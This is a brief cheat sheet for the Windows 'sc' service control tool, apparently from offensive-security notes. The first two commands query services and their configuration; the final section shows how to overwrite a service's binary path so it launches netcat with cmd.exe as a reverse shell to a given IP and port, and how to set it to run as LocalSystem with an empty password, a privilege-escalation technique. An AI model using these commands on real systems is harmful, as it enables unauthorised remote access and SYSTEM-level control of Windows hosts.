# sc

> service control

## query all services

    sc query

## get service config

    sc qc <service>

## overwrite service config value

note: the space after the equal sign is mandatory

    sc config <service> binpath= "C:\nc.exe -nv <ip> <port> -e C:\WINDOWS\System32\cmd.exe"
    sc config <service> obj= ".\LocalSystem" password= ""
